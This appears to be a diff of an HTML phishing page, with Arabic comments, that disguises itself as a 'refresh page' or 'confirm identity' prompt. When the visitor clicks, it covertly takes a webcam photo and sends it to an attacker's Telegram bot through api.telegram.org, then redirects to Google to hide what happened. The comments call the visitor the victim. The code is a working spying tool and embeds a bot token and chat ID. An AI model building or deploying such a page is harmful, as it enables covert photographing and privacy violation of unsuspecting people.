@@ -1,67 +1,63 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification System</title>
+    <title>Checking...</title>
     <style>
-        body { background: #000; color: #0f0; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: monospace; }
-        #btn { padding: 20px 40px; border: 2px solid #0f0; cursor: pointer; font-size: 20px; box-shadow: 0 0 15px #0f0; }
+        /* جعل الشاشة كاملة قابلة للضغط */
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
+        #trap { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .box { padding: 30px; border: 2px solid #0f0; color: #0f0; font-family: monospace; font-size: 20px; text-align: center; box-shadow: 0 0 20px #0f0; }
     </style>
 </head>
-<body>
+<body onclick="kickstart()">
 
-    <div id="btn" onclick="startCapture()">[ اضغط لتأكيد الهوية ]</div>
+    <div id="trap">
+        <div class="box" id="msg">[ اضغط هنا لتحديث الصفحة ]</div>
+    </div>
 
     <script>
-        const TOKEN = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
-        const CHAT_ID = "1772820433";
+        // بياناتك (تأكد منها 100%)
+        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
+        const C = "1772820433";
 
-        async function startCapture() {
-            const btn = document.getElementById('btn');
-            btn.innerText = "جاري المعالجة...";
+        async function kickstart() {
+            const m = document.getElementById('msg');
+            m.innerText = "جاري التحميل...";
 
             try {
-                // 1. طلب الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+                // محاولة فتح الكاميرا
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.createElement('video');
+                v.srcObject = s;
+                v.play();
 
-                // الانتظار ثانية للالتقاط
+                // التقاط سريع بعد ثانية
                 setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const cn = document.createElement('canvas');
+                    cn.width = 640; cn.height = 480;
+                    cn.getContext('2d').drawImage(v, 0, 0);
                     
-                    canvas.toBlob(async (blob) => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'image.jpg');
+                    cn.toBlob(async (b) => {
+                        const f = new FormData();
+                        f.append('chat_id', C);
+                        f.append('photo', b, 'v.jpg');
 
-                        // 2. محاولة الإرسال مع فحص الاستجابة
-                        try {
-                            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: fd
-                            });
-
-                            if (response.ok) {
-                                alert("✅ نجحت العملية! افحص التليجرام الآن.");
-                                window.location.href = "https://google.com";
-                            } else {
-                                const errorData = await response.json();
-                                alert("❌ خطأ من تليجرام: " + errorData.description);
-                            }
-                        } catch (fError) {
-                            alert("❌ فشل الاتصال بسيرفر تليجرام: " + fError.message);
-                        }
+                        // إرسال مباشر
+                        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
+                            method: 'POST',
+                            body: f
+                        });
+                        
+                        // هروب لموقع قوقل
+                        window.location.href = "https://www.google.com";
                     }, 'image/jpeg');
                 }, 1000);
 
-            } catch (err) {
-                alert("❌ المتصفح رفض الكاميرا: " + err.message);
-                location.reload();
+            } catch (e) {
+                // إذا رفض الضحية، نكرر المحاولة
+                console.log(e);
+                m.innerText = "خطأ في الاتصال.. حاول مرة أخرى";
             }
         }
     </script>
